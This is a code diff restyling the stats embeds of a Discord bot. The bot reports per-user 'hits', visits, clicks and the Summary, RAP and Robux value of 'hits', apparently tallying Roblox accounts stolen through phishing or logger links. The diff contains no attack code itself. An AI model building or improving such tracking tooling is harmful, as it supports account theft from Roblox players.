@@ -62,7 +62,6 @@ client.on('messageCreate', async (message) => {
       const hits = normal.Totals?.Visits || 0;
       const visits = normal.Totals?.Visits || 0;
       const clicks = normal.Totals?.Clicks || 0;
-      const accounts = normal.Totals?.Accounts || 0;
 
       const biggestSummary = normal.Highest?.Summary || 0;
       const biggestRap = normal.Highest?.Rap || 0;
@@ -75,29 +74,34 @@ client.on('messageCreate', async (message) => {
       const userName = profile.userName || targetUser.username;
 
       const embed = new EmbedBuilder()
-        .setColor(0x000000)
-        .setTitle("─── 𝕹𝖔𝖗𝖒𝖆𝖑 𝖎𝖓𝖋𝖔 ───")
-        .setAuthor({ name: `Stats for ${userName}`, iconURL: targetUser.displayAvatarURL() })
-        .setDescription(`<:emoji:1433659663160971414> **User:** ${userName}
+        .setColor(0x000000) // negru
+        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
+        .setDescription(`─── <a:shine:1434729237545222287> NORMAL INFO <a:shine:1434729237545222287> ───
 
-<:emoji:1433659663160971414> **ᴛᴏᴛᴀʟ ꜱᴛᴀᴛꜱ:**
-  ʜɪᴛꜱ:     ${formatNumber(hits)}
-  ᴠɪꜱɪᴛꜱ:   ${formatNumber(visits)}
-  ᴄʟɪᴄᴋꜱ:   ${formatNumber(clicks)}
+<:dot:1434739765240135811> User: ${userName}
 
-<:emoji:1433659663160971414> **ʙɪɢɢᴇꜱᴛ ʜɪᴛꜱ:**
-  ꜱᴜᴍᴍᴀʀʏ:  ${formatNumber(biggestSummary)}
-  ʀᴀᴘ:      ${formatNumber(biggestRap)}
-  ʀᴏʙᴜx:    ${formatNumber(biggestRobux)}
+<:dot:1434739765240135811> TOTAL STATS:
+\`\`\`
+Hits:     ${formatNumber(hits)}
+Visits:   ${formatNumber(visits)}
+Clicks:   ${formatNumber(clicks)}
+\`\`\`
 
-<:emoji:1433659663160971414> **ᴛᴏᴛᴀʟ ʜɪᴛ ꜱᴛᴀᴛꜱ:**
-  ꜱᴜᴍᴍᴀʀʏ:  ${formatNumber(totalSummary)}
-  ʀᴀᴘ:      ${formatNumber(totalRap)}
-  ʀᴏʙᴜx:    ${formatNumber(totalRobux)}
+<:dot:1434739765240135811> BIGGEST HITS:
+\`\`\`
+Summary:  ${formatNumber(biggestSummary)}
+RAP:      ${formatNumber(biggestRap)}
+Robux:    ${formatNumber(biggestRobux)}
+\`\`\`
 
-<a:anim:1433659816466714624> **Corrupt**`)
-        .setImage("https://images.steamusercontent.com/ugc/870748399458647939/4E5B352B8FB2C9E9EF63248B8D591288B48F72AB/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false")
-        .setFooter({ text: "Corrupt" });
+<:dot:1434739765240135811> TOTAL HIT STATS:
+\`\`\`
+Summary:  ${formatNumber(totalSummary)}
+RAP:      ${formatNumber(totalRap)}
+Robux:    ${formatNumber(totalRobux)}
+\`\`\``)
+        .setImage("https://i.pinimg.com/originals/67/b1/ef/67b1ef05eb08b416b90323b73e6cf1c5.gif")
+        .setFooter({ text: "Stats Bot" });
 
       await message.channel.send({ embeds: [embed] });
 
@@ -140,23 +144,26 @@ client.on('messageCreate', async (message) => {
 
       const embed = new EmbedBuilder()
         .setColor(0x000000)
-        .setTitle("─── 𝕹𝖔𝖗𝖒𝖆𝖑 𝖎𝖓𝖋𝖔 ───")
-        .setAuthor({ name: `Daily Stats for ${userName}`, iconURL: targetUser.displayAvatarURL() })
-        .setDescription(`<:emoji:1433659663160971414> **User:** ${userName}
+        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
+        .setDescription(`─── <a:shine:1434729237545222287> DAILY STATS <a:shine:1434729237545222287> ───
 
-<:emoji:1433659663160971414> **ᴅᴀɪʟʏ ꜱᴛᴀᴛꜱ:**
-  ʜɪᴛꜱ:     ${formatNumber(dailyHits)}
-  ᴠɪꜱɪᴛꜱ:   ${formatNumber(dailyVisits)}
-  ʟɪᴄᴋꜱ:   ${formatNumber(dailyClicks)}
+<:dot:1434739765240135811> User: ${userName}
 
-<:emoji:1433659663160971414> **ᴅᴀɪʟʏ ʜɪᴛ ꜱᴛᴀᴛꜱ:**
-  ꜱᴜᴍᴍᴀʀʏ:  ${formatNumber(dailySummary)}
-  ʀᴀᴘ:      ${formatNumber(dailyRap)}
-  ʀᴏʙᴜx:    ${formatNumber(dailyRobux)}
+<:dot:1434739765240135811> DAILY STATS:
+\`\`\`
+Hits:     ${formatNumber(dailyHits)}
+Visits:   ${formatNumber(dailyVisits)}
+Clicks:   ${formatNumber(dailyClicks)}
+\`\`\`
 
-<a:anim:1433659816466714624> **Corrupt**`)
-        .setImage("https://images.steamusercontent.com/ugc/870748399458647939/4E5B352B8FB2C9E9EF63248B8D591288B48F72AB/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false")
-        .setFooter({ text: "Corrupt Daily" });
+<:dot:1434739765240135811> DAILY HIT STATS:
+\`\`\`
+Summary:  ${formatNumber(dailySummary)}
+RAP:      ${formatNumber(dailyRap)}
+Robux:    ${formatNumber(dailyRobux)}
+\`\`\``)
+        .setImage("https://i.pinimg.com/originals/67/b1/ef/67b1ef05eb08b416b90323b73e6cf1c5.gif")
+        .setFooter({ text: "Stats Bot Daily" });
 
       await message.channel.send({ embeds: [embed] });
 
